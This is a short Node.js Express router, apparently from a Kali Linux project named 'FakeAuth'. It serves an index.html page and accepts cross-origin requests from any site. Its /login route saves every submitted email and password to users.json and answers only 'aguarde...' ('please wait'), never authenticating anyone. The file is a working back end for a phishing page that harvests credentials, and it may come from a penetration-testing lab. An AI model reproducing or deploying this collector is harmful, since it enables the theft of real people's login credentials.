var express = require('express');
var router = express.Router();
var fs = require('fs');

const filePath = ("/home/kali/FakeAuth/users.json");

/* GET home page. 
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});*/

// alguns navegadores enviam uma requisicao OPTIONS antes de POST e PUT
router.route('/*') 
 .options(function(req, res) {  // OPTIONS
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'POST, GET, PUT, DELETE');
   res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, Content-Length, X-Request-With');
   res.sendStatus(200);
   }
 ),

// index.html
router.route('/')
 .get(function(req, res) {  // GET
   var path = 'index.html';
   res.header('Cache-Control', 'no-cache');
   res.sendFile(path, {"root": "./"});
   }
 );

function login(req, res){
  
  try{
    var usersMap = new Map(Object.entries(JSON.parse(fs.readFileSync(filePath))));
  }catch(err){
    var usersMap = new Map();
  }
  
  var response = {};
  var user = req.body;
  usersMap.set(user.email, user);
  fs.writeFileSync(filePath, JSON.stringify(Object.fromEntries(usersMap)));
  response = {"resultado":"aguarde..."};
    
  res.json(response);
}  

router.route('/login')
  .post(login);


module.exports = router;
